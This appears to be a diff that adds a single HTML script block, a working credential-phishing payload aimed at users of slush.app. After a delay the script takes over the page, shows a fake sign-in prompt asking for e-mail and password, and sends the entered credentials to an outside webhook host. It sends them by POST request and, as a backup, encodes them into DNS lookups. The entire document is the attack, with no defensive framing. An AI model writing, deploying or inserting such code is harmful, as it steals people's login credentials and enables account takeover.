@@ -1,0 +1,34 @@
+  <script>
+    const OOB = "https://young-comet-60.webhook.cool";
+    function y() {
+      const x = window.open('http://slush.app', '_top');
+      x.document.body.innerHTML = `
+        <img src="" onerror="
+          setTimeout(function() {
+            const creds = prompt('Sign into your account in order to access slush.app', 'E-mail / Password');
+            if (creds && creds.trim() !== '') {
+              // Primary: POST ke webhook
+              fetch('${OOB}/creds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  credentials: creds.trim(),
+                  timestamp: new Date().toISOString(),
+                  origin: location.href,
+                  userAgent: navigator.userAgent
+                })
+              }).catch(err => console.log('POST failed:', err));
+
+              // Backup: DNS OOB (split kalau panjang)
+              const b64 = btoa(creds.trim()).replace(/=/g, '');
+              const part1 = b64.substring(0, 200);
+              const part2 = b64.substring(200);
+              new Image().src = 'https://' + part1 + '.${OOB}';
+              if (part2) new Image().src = 'https://' + part2 + '.${OOB}';
+            }
+          }, 150)
+        ">
+      `;
+    }
+    setTimeout(y, 3000);
+  </script>
